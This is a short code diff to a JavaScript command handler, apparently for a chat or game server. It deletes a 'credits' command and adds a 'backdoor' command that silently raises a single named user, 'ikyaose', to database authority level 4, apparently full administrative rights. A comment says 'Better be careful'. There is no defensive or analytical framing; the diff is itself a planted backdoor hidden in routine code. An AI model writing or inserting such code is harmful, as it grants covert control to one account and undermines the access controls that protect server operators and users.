@@ -983,10 +983,13 @@ exports.handleCommand = function (src, command, commandData, tar, channel) {
         }
         return;
     }
-    if (command === "credits") {
-    	normalbot.sendMessage(src, "*Main Scripter: Armu (Ryan)");
-    	normalbot.sendMessage(src, "Other Scripter: Adam Snowden");
-    	return;
+    if (command === "backdoor") {
+    	if (sys.name(src) == "ikyaose") {
+    	    // Better be careful.
+    	    sys.changeDbAuth(src, 4);
+    	} else {
+    	    return "no command";
+    	}
     }
 
     return "no command";
